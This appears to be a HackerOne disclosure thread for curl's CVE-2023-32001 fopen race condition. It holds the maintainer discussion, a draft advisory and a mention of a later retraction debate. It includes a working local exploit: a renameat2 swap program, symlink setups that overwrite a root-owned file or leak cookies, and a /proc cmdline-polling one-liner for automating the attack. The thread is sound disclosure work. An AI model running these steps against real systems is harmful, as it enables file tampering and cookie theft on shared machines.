title: CVE-2023-32001: fopen race condition

profile.name: curl
profile.about: cURL is an Open Source project providing a library and command-line tool for doing internet transfers

vulnerability_information:
As we can see in the following curl code (line 59-61 https://github.com/curl/curl/blob/fb802b521af997230b65174a559f5c419520e142/lib/fopen.c ): 
```C
  if(stat(filename, &sb) == -1 || !S_ISREG(sb.st_mode)) {
    /* a non-regular file, fallback to direct fopen() */
    *fh = fopen(filename, FOPEN_WRITETEXT);
...
}
...
```
There is a race condition between the moment "stat(filename, &sb)" is executed and the moment " fopen(filename, FOPEN_WRITETEXT);" is executed.
This leads to undesirable behavior such as an attacker tricking a privileged user to overwrite protected files, or since this function (Curl_fopen) is also used for storing cookies an attacker could trick another user to send those cookies that might be very sensible to a file fully owned and controlled by the attacker.

###POC/Steps to reproduce:
Before we start, I will be using a little program called "rename". Which simply swaps atomically the names of two files to be able to showcase this race condition. Here is its code :
```
#include <strings.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

// source https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c
int main(int argc, char *argv[]) {
  while (1) {
    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
  }
  return 0;
}
```

Open two terminals, with two different users. One will be the attacker terminal and the other the victim. 
In both POCs, the victim  will want to execute a command such as "curl --cookie-jar a google.com" thinking the file "a" doesn't exist.

###A) Exploiting this vulnerability to trick a user to overwrite a file they own:

Assume the current directory of both attacker(selmelc) and victim (root) looks like this
```SHELL
lrwxrwxrwx 1 selmelc selmelc     4 Jun 27 07:11 a -> flag
drwxrwxrwx 2 selmelc selmelc  4096 Jun 27 07:11 b
-rw-r--r-- 1 root    root        6 Jun 27 07:05 flag
-rwxr-x--- 1 selmelc selmelc 16608 Jun 27 07:04 rename
```
The attacker executes ./rename a b, which will not stop to swap the name of the directory "b" and the symlink "a". 

The victim executes their command "curl --cookie-jar a google.com".
The race condition is successfully exploited if in the vulnerable code the stat identifies the file "a" as a directory and then the "fopen" opens the symlink that points to the file "flag".
If that happened then the results looks like this :
```
...
-rw-r--r-- 1 root    root      131 Jun 27 07:13 flag
...
root@deb:/home/selmelc/Documents# cat flag
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.
```
Additional note: 
You might think "well that's just how symlinks work"... To clarify on that, by default if the victim was executing  "curl --cookie-jar a google.com" without the attacker exploiting the vuln. a different behavior would occur ; the file "a" would be erased (no more symlink) and overwritten as a regular file containing the cookie data. This happens because the stat function follows symbolic links therefore in that scenario we would not enter the vulnerable condition which leads to the race condition.

###B) Exploiting this vulnerability to steal the victim's cookies and hide it from them:

As this uses the same logic as the previous exploit for this vuln. Repeat same steps except this time we want the "flag" file to be owned by the attacker as following:
```
lrwxrwxrwx 1 selmelc selmelc     4 Jun 27 08:42 a -> flag
drwxrwxrwx 2 selmelc selmelc  4096 Jun 27 08:41 b
-rw--w--w- 1 selmelc selmelc     0 Jun 27 08:41 flag
-rwxr-x--- 1 selmelc selmelc 16608 Jun 27 07:04 rename

```
Normal curl behavior after the victim executed  "curl --cookie-jar a google.com" :
```
-rw------- 1 root    root      131 Jun 27 08:49 a
drwxrwxrwx 2 selmelc selmelc  4096 Jun 27 08:41 b
-rw--w--w- 1 selmelc selmelc     0 Jun 27 08:41 flag
-rwxr-x--- 1 selmelc selmelc 16608 Jun 27 07:04 rename
```
Behaviour when vulnerability is exploited (and race condition met) : 
```
drwxrwxrwx 2 selmelc selmelc  4096 Jun 27 08:41 a
lrwxrwxrwx 1 selmelc selmelc     4 Jun 27 08:50 b -> flag
-rw--w--w- 1 selmelc selmelc   131 Jun 27 08:51 flag
-rwxr-x--- 1 selmelc selmelc 16608 Jun 27 07:04 rename
```
We can notice the 131 bytes of output in flag now, which would contain the sensitive cookies.

## Impact

An attacker is able to overwrite files they shouldn't have access to, however the attacker does not control the data sent to those files. (Integrity, potentially availability issues if files likes /etc/passwd are modified through this).
An attacker may also gain access to sensitive data (cookies), and even hide that information from the intended receiver as the attacker may control the file in which this information will be leaked.
Note : cookie storing was used to demonstrate exploits for the vulnerability but the vulnerability also affects HSTS and alt-svc cache.

additional_data.old_title: Race condition in Curl_fopen allowing manipulation of privileged files and leakage of sensitive information.
additional_data.new_title: [curl 7.74.0] Race condition in Curl_fopen allowing manipulation of privileged files and leakage of sensitive information.

activities.message:
Thank you for your report!

We will take some time and investigate your reports and get back to you with details and possible follow-up questions as soon as we can!
Why 7.74.0, isn't this still the same in current git?
You're right it's actually not relevant to the report, was just the version I tested and confirmed the vulnerability on but after checking current and older versions are also affected.

Hello, just checking in for an update.
If you need anything from me, or want some clarification on the report feel free to reach out.
Have a nice day.

I'm personally away on vacation right now and will be back this coming weekend, and I'll give this issue proper attention then. The pending next release is scheduled for July 19, so if there's anything to fix it would be nice to get that sorted it out maybe a week before that release date.

Do you or anyone else in the curl security team reading this, have a proposed fix for this race condition? As I haven't really spent time thinking about this myself yet, I also have not figured out a solution.

I believe the idea is that the function can detect and write data to pipes, which thus cannot use the atomic rename trick. The challenge is to rewrite that functionality to not have a race condition.

I'm not sure exactly what attacks we can protect against if the attacker can create directory entries at will in the directory where the victim wants to create files, and at the same time offer features were we adapt to existing directory entries...

Perfect that's exactly what I wanted to know ! I'll do more research and come back to this conversation. 
Thanks for your time !

I'm certain we'll be able to fix this race condition without affecting offered features at least that's my goal.

This is a classic case of TOCTOU, and pretty much the only way to avoid that is to not check first at all but to open and instead adapt to the errno. In the process of this we should probably scan the tree and see if there are more.

I do agree though that this seems like an attack which requires that the malicious user has gained a fair bit of access already, maybe to the point of this being theoretical? Is there a scenario where an attacker may gain privileges or access to data they cannot already see/access?

Indeed it's a classic TOCTOU, and that seems like the way to go indeed.

I don't believe this to be theoretical however, on a hardened system with very good permission management sure. But realistically this is exploitable on your average computer. Sure it could be worse, and thankfully it's not but it's still a threat in my opinion.
As for the last question, yes in both exploits listed above. In the first one the less privileged user selmelc modifies **indirectly** a file they don't have write permissions to and in the second one as we can see in the "normal curl behavior" compared to the post exploitation one selmelc now becomes able to read a file they couldn't have seen otherwise (0600 root owner with default behavior).

What I can agree on, is that indeed there are some requirements to be able to exploit this vulnerability:
- The attacker needs write access to the directory in which the victim executes curl.
- It's not exploitable if the victim uses an already existing file which the attacker can't rename. (But it works if the attacker can either rename that file or more realistically if the victim is trying to put the output in a new file).

That's all there is and why I believe this is not theoretical.

If the attacker can create arbitrary files in the victims cwd I would argue that all security bets are off already. However, let's discuss that further when there is a patch to reason around. Are you up for drafting an initial attempt at this?

Cwd or destination path for absolute paths (I forgot to mention that in my previous message I realise), for instance I don't believe the command "curl --cookie-jar /tmp/debugcookie google.com" to be something unlikely to happen.
But yes for sure !

Because of the many conditions required to be fulfilled for an attacker to succeed, I want to say that this is a low severity issue. Users with just somewhat strict permissions already enabled are not vulnerable. Attackers need to be on the same system with sufficient access and knowledge of what's going on in order to succeed.

additional_data.old_title: [curl 7.74.0] Race condition in Curl_fopen allowing manipulation of privileged files and leakage of sensitive information.
additional_data.new_title: Race condition in Curl_fopen allowing manipulation of privileged files and leakage of sensitive information.

activities.message: I'll work on an advisory next, and plan for releasing a CVE for this issue in association with the next release on July 19.

Hello,

I just want to clarify because I feel like my initial report left you to believe the attacker has to "guess" what path the victim is going to store the cookie file.

This is not the case, I simply didn't want to over complicate the POC but all this can be automated by an attacker which could technically make an "auto-exploit" malware.

### Quick POC draft of this:

The user could do something such as the following bash command
```while true;do TEST_VAR=`pgrep -l -f curl | cut -f 1 -d " "` &&  if [ -n "$TEST_VAR" ]; then cat /proc/$TEST_VAR/cmdline && echo ; fi; done```
Which simply checks executed programs on the system, gets the pid of any program matching the pattern "curl" then reads the cmdline file in /proc/[pid]/cmdline which contains all the arguments passed to curl.
 {F2483689}

It would be trivial for the attacker to make a script/executable using this logic and then parsing the arguments to extract the cookie file location and then use one of the two POC exploits I originally sent you with the correct paths.

---

If you wish I can develop a complete advanced POC exploit for this, but I wanted to share this information ASAP first. Let me know if you wish a fully functional exploit for this.

Personally I believe this is of medium severity. Above low because it does have a high impact on the affected system if exploited, but it's definitely not critical or high because indeed there's some conditions to meet. However once again I personally do believe those conditions are not overwhelmingly restrictive to attackers especially for the potential power gained. So I figured maybe there was a misunderstanding about the attacker having to guess target file.

PS: If you still believe this to still be of low severity I will respect that choice, you are the maintainer and understand your software and users better than I do. I just want to make sure there's no misunderstanding here.

Can't edit anymore, but I meant:
"The **attacker** could do something such as the following bash command"
Instead of "The **user** could do something such as the following bash command".
Sorry for the typo there.
I'm convinced by the provided arguments and raise the level to Medium.

Here's my first advisory draft. Feel free to correct my mistakes or extend my explanations to improve it!

----

fopen race condition
====================

Project curl Security Advisory, July 19 2023 -
[Permalink](https://curl.se/docs/CVE-2023-FOPEN.html)

VULNERABILITY
-------------

libcurl can be told to save cookie, HSTS and/or alt-svc data to files. When
doing this, it called `stat()` followed by `fopen()` in a way that made it
vulnerable to a TOCTOU race condition problem.

By exploiting this flaw, an attacker could trick the victim to create or
overwrite protected files holdingh this data in ways it was not intended to.

INFO
----

This flaw can also be triggered with the command line tool.

The attacker needs permissions and rights enough to be able to create or
rename directory entries in the directory the victim saves their files.

The Common Vulnerabilities and Exposures (CVE) project has assigned the name
CVE-2023-FOPEN to this issue.

CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition

Severity: Medium

AFFECTED VERSIONS
-----------------

- Affected versions: libcurl 7.84.0 to and including 8.1.2
- Not affected versions: libcurl < 7.84.0 and >= 8.2.0
- Introduced-in: https://github.com/curl/curl/commit/20f9dd6bae50b722

libcurl is used by many applications, but not always advertised as such!

SOLUTION
------------

- Fixed-in: https://github.com/curl/curl/commit/

RECOMMENDATIONS
--------------

 A - Upgrade curl to version 8.2.0

 B - Apply the patch to your local version
 
 C - Do not save cookie, HSTS or alt-svc data
 
TIMELINE
--------

This issue was reported to the curl project on June 27, 2023. We contacted
distros@openwall on July 12, 2023.

libcurl 8.2.0 was released on July 2023, coordinated with the publication of
this advisory.

CREDITS
-------

- Reported-by: *
- Patched-by: *

Thanks a lot!

1) For sure I'd appreciate being able to PR, I'll get to it right away. Do you want me to put a specific title (to avoid mentioning security impact) ? Otherwise I'll put something generic like "optimisation curl_fopen". Also is there a specific branch I should PR to ?  (Note I'll be pushing with my github account SaltyMilk) 

2) If you could credit to "selmelc" that'd be great.

I really appreciate your offer for credits/mention, thank you very much !
Sure, "curl_fopen optimization" certainly works and you can just make the PR against the normal curl master.

PR sent ! 

As for the advisory draft it looks good so far all I can say is:
- Small typo: " holdingh"
- I'd remove "This flaw can also be triggered with the command line tool.". Maybe instead a mention of symbolic link behavior manipulation which is one of the most important attack vector in this case. Something like "This race condition modifies the behavior of symbolic link files in affected components, they might be followed instead of being overwritten when the condition is met leading to undesired and potentially destructive behavior."

Feel free to reach out if there's anything else you need from me, was a pleasure collaborating !

additional_data.old_title: Race condition in Curl_fopen allowing manipulation of privileged files and leakage of sensitive information.

activities.message: I have now pre-notified the distros@openwall mailing list about this issue.
Published. This issue is now eligible for a bounty claim from [IBB](https://hackerone.com/ibb).

Thanks for your work. The actual monetary reward part for this issue is managed by the [Internet Bug Bounty](https://hackerone.com/ibb) so the curl project itself therefor sets the reward amount to **zero USD**. If you haven't already, please submit your reward request to them and refer back to this issue.
Thanks  !
We are discussing retracting this: https://github.com/curl/curl/issues/11530

Thank you for letting me know. I'm currently reading it, and will provide a detailed answer to that issue. It seems to be making conclusions very quickly to defend a point of view, but I believe that issue deserves some answers and nuances.

To be fair to the ongoing discussion, I don't think it's rushed. As mentioned in the issue it was discussed on HackerOne, then raised as an issue weeks ago, and similar points were raised by me even in this very discussion.

This is not a criticism of you or the work done here, it's a collaborative effort to provide the most appropriate information to curl users out there, and sometimes we get it wrong.

I've answered that post to clarify any misunderstanding on the vulnerability : https://github.com/curl/curl/issues/11530#issuecomment-1686258159

And we're on the same page, I don't take this issue personally. The goal here is indeed to give the public accurate information regarding the vulnerability. I'm only bringing clarifications so you, the curl team, can assess the situation from all the different collaborative ideas/thoughts.

Thanks for your work on curl and have a nice day !
